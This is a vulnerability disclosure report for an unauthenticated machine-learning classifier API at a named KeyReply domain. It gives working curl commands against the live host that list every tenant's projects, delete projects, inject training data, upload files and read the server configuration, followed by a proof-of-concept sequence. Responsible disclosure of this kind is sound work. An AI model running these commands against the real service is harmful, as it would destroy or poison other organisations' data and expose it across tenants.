# 🚨 紧急VDP提交 - Critical级别漏洞

## 提交优先级：P0 - 紧急

---

## 漏洞1：Classifier3 AI服务完全未授权访问（Critical）

**标题**: [Critical] Complete Unauthorized Access to ML Classifier Service - Data Breach + Destructive Capabilities

**严重度**: Critical
**CVSS 3.1**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### 描述：
The KeyReply Classifier3 AI service (classifier3.app.keyreply.com) has **complete absence of authentication** on all API endpoints, exposing critical operations including:
1. Viewing all projects/models across all tenants
2. Deleting any project/model/data
3. Uploading files and importing data
4. Viewing server configuration and status

This is a **multi-tenant system failure** affecting all KeyReply customers, not just SGH.

### Affected Endpoints：

#### 1. GET /ie/ - List All Projects (No Auth)
```bash
curl https://classifier3.app.keyreply.com/ie/
```
**Returns**: Complete list of 50+ projects with all model IDs and versions

#### 2. DELETE /ie/delete - Delete Any Project (No Auth)
```bash
curl -X DELETE "https://classifier3.app.keyreply.com/ie/delete?project_id=[ANY_ID]"
```
**Returns**: `{"message":"success delete data","status_code":200}`

#### 3. POST /ie/import/json - Inject Malicious Data (No Auth)
```bash
curl -X POST "https://classifier3.app.keyreply.com/ie/import/json?project_id=[ID]&model_id=[ID]" \
  -H "Content-Type: application/json" -d '{"questions":[]}'
```
**Returns**: `{"message":"Success import data","status_code":200}`

#### 4. POST /ie/import - Upload Files (No Auth)
```bash
curl -X POST "https://classifier3.app.keyreply.com/ie/import?project_id=[ID]&model_id=[ID]" \
  -F "file=@malicious.txt"
```
**Returns**: `{"status_code":201}` - File accepted

#### 5. GET /setting - View Server Config (No Auth)
```bash
curl https://classifier3.app.keyreply.com/setting
```
**Returns**: 
```json
{
  "authkey": "",          ← Empty authkey confirms no auth
  "log_level": "debug",   ← Debug mode enabled
  "host": "0.0.0.0",
  "port": 5000
}
```

### Impact：

**Confidentiality**: 
- ✅ Complete exposure of all ML projects across all tenants
- ✅ Access to all model metadata, versions, training status
- ✅ Multi-tenant isolation completely broken

**Integrity**: 
- ✅ Can delete ANY project/model/data without authentication
- ✅ Can inject malicious training data (model poisoning)
- ✅ Can corrupt ML models causing wrong predictions
- ✅ Irreversible data loss

**Availability**: 
- ✅ Can delete all models causing complete service outage
- ✅ Can upload large files for DoS
- ✅ Can overload training processes

**Business Impact**:
- Patient safety risk (if medical AI models are corrupted)
- Complete loss of customer trust
- Regulatory compliance violations (PDPA, HIPAA if applicable)
- Financial loss from model retraining
- Reputation damage

### Affected Customers:
Based on exposed projects, this affects **50+ projects** from multiple organizations, not just SGH.

### Proof of Concept:

**Step 1**: View all projects
```bash
curl https://classifier3.app.keyreply.com/ie/
# Returns 50+ project IDs
```

**Step 2**: Verify no authentication
```bash
curl https://classifier3.app.keyreply.com/setting
# Returns: "authkey": ""
```

**Step 3**: Test DELETE (non-destructive test)
```bash
curl -X DELETE "https://classifier3.app.keyreply.com/ie/delete?project_id=nonexistent"
# Returns: "success delete data"
```

### Recommended Fix (Immediate - P0):

1. **Implement authentication on ALL endpoints**
   - Add API key validation middleware
   - Implement JWT-based authentication
   
2. **Implement authorization checks**
   - Verify user owns the project_id
   - Implement RBAC (Role-Based Access Control)
   
3. **Disable dangerous operations**
   - Temporarily disable DELETE endpoints
   - Add confirmation requirements
   
4. **Audit logs**
   - Review all access logs
   - Check for unauthorized access/deletion
   
5. **Change authkey**
   - Generate strong authkey
   - Rotate immediately

### Timeline:
- **Discovered**: 2025-11-17
- **Testing Method**: Passive API documentation review + non-destructive testing
- **VDP Compliant**: Yes (no actual data was deleted or exfiltrated)

---

## 🚨 紧急程度：P0

**建议立即修复时间**: < 24小时

**原因**：
1. Complete authentication bypass
2. Destructive DELETE operations exposed
3. Multi-tenant data exposure
4. Actively exploitable with zero prerequisites
5. Affects critical healthcare AI systems

---

## 📝 测试声明

**VDP Compliance**:
- ✅ Only tested with non-existent project_id ("test") for DELETE
- ✅ Did not delete any real projects
- ✅ Did not exfiltrate training data
- ✅ Did not upload malicious files
- ✅ Did not abuse prediction API
- ✅ Only accessed publicly available endpoints

All testing was non-destructive and compliant with responsible disclosure guidelines.

